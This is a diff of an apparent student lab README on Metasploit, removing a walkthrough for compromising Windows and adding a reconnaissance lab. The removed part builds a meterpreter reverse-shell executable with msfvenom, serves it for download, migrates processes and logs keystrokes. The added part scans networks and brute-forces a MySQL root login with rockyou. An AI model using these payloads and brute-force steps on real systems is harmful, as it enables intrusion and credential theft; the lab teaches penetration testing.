@@ -1,11 +1,10 @@
-# Compromising-windows-using-Metasploit
-Compromising windows using Metasploit
+# Metasploit-for-reconnaissance
 # Metasploit
-Compromising windows using Metasploit
+Metasploit for reconnaissance in pentesting
 
 # AIM:
 
-To Compromise windows using Metasploit .
+To get introduced to Metasploit Framework and to  perform reconnaissance  in pentesting .
 
 ## DESIGN STEPS:
 
@@ -21,96 +20,59 @@ Investigate on the various categories of tools as follows:
 
 Open terminal and try execute some kali linux commands
 
-## PROGRAM:
+## EXECUTION STEPS AND ITS OUTPUT:
 
-Find the attackers ip address using ifconfig
+
 ## OUTPUT:
-![s](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/d9b9e488-6580-4969-a3d2-5061443c0ed1)
-
-
-
-Create a malicious executable file fun.exe using msenom command
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
-## OUTPUT
-![1](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/12b58fda-5cec-4e47-872b-b838ef920d46)
-
-
-
-
-copy the fun.exe into the apache /var/www/html folder
-![2](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/37d7e507-5d47-4ddb-ba93-586f6d73a51b)
-
-
-Start apache server
-sudo systemctl apache2 start
-
-![3](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/0d0224f9-d80c-42b9-a3ab-09b48da66a27)
-
-
-
-Check the status of apache2
-![4](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/77516604-9c4f-4317-a188-c41de4625542)
-
-
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/584a6e38-f7f5-48d1-a794-e46919e7f8d8)
 
 Invoke msfconsole:
-## OUTPUT:
-
-
-
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/8ece81bd-8d91-498d-91cc-18096809bf40)
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/6d8173b7-464c-4be9-9c3c-075633e02d2b)
 
+Port Scanning:
+Following command is executed for scanning the systems on our local area network with a TCP scan (-sT) looking for open ports between 1 and 1000 (-p1-1000). msf > nmap -sT 192.168.1810/24 -p1-1000
+OUTPUT:
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/ff252e3e-fe1e-4a93-b754-5d4ced4f68b7)
 
-Starting a command and control Server
-use multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 0.0.0.0
-exploit
-![6](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/938f78c9-0e8a-42ef-847c-a7cee7393beb)
+step4: use the db-nmap command to scan and save the results into Metasploit's postgresql attached database. In that way, you can use those results in the exploitation stage later.
 
+scan the targets with the command db_nmap as follows. msf > db_nmap 192.168.181.0/24
+OUTPUT:
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/3ee66371-ccc9-4245-b5ff-5356809e362c)
 
+Metasploit has a multitude of scanning modules built in. If we open another terminal, we can navigate to Metasploit's auxiliary modules and list all the scanner modules. cd /usr/share /metasploit-framework/modules/auxiliary kali > ls -l
 
-On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
-http://192.168.1.2/fun.exe
-The file "fun.exe" downloads. 
-![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/4cf82361-ac00-46ab-92a2-3f09592d98d5)
+OUTPUT:
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/fbb24c97-3807-46e7-b06b-c3b625967215)
 
+Search is a powerful command in Metasploit that you can use to find what you want to locate. msf >search name:Microsoft type:exploit
 
-Bypass any warning boxes, double-click the file, and allow it to run.
+The info command provides information regarding a module or platform,
 
-On kali give the command exploit
-![8](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/fee0700e-bafd-4e76-af72-f5ac23a5d6ba)
+OUTPUT
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/97a56fd6-c08c-43d3-8816-6a1fcef38c56)
 
+Before beginning, set up the Metasploit database by starting the PostgreSQL server and initialize msfconsole database as follows: systemctl start postgresql msfdb init
 
-To see a list of processes, at the meterpreter > prompt, execute this command:
-ps  ⇒ can see the fun.exe process running with pid 1156
+MYSQL ENUMERATION
+Find the IP address of the Metasploitable machine first. Then, use the db_nmap command in msfconsole with Nmap flags to scan the MySQL database at 3306 port. db_nmap -sV -sC -p 3306 <metasploitable_ip_address>
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/93452bc1-249d-4a05-bda6-140c2db75eea)
+Use the search option to look for an auxiliary module to scan and enumerate the MySQL database. search type:auxiliary mysql
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/fde3f8b6-db49-4248-8f77-39d61ea12557)
+use the auxiliary/scanner/mysql/mysql_version module by typing the module name or associated number to scan MySQL version details. use 11 Or: use auxiliary/scanner/mysql/mysql_version
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/93d8988f-b7a0-46c2-b816-262083158bf4)
+Use the set rhosts command to set the parameter and run the module, as follows:
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/41895fb8-8adf-4e5d-a486-0bb7cfda2f8c)
+After scanning, you can also brute force MySQL root account via Metasploit's auxiliary(scanner/mysql/mysql_login) module.
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/e3a3574e-8c7e-4148-9cf5-5064b270f690)
+set the PASS_FILE parameter to the wordlist path available inside /usr/share/wordlists: set PASS_FILE /usr/share/wordlistss/rockyou.txt Then, specify the IP address of the target machine with the RHOSTS command. set RHOSTS Set BLANK_PASSWORDS to true in case there is no password set for the root account. set BLANK_PASSWORDS true
+![image](https://github.com/1808charitha/Metasploit-for-reconnaissance/assets/132996838/671d8b95-a4c4-4be3-a006-52c6dccf5803)
 
-The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
-To become more persistent, we'll migrate to a process that will last longer.
-Let's migrate to the winlogon process.
-At the meterpreter > prompt, execute this command:
-
-migrate -N explorer.exe
-at meterpreter > prompt, execute this command:
-netstat
-A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
-Notice the "PID/Program name" value for this connection, which is redacted 
-![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)
-
-
-
-Post Exploitation
-The target is now owned. Following are meterpreter commands for key capturing in the target machine
-keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
-![9](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/85fb473c-59fe-4042-b163-552fddc735d1)
-
-
-
-keyscan_dump	Shows the keystrokes captured so far
-![10](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/785ef849-9095-4065-b38a-54b544a0c440)
 
 
 
 ## RESULT:
-The Metasploit framework for reconnaissance is  examined successfully.
+The Metasploit framework for reconnaissance is  examined successfully
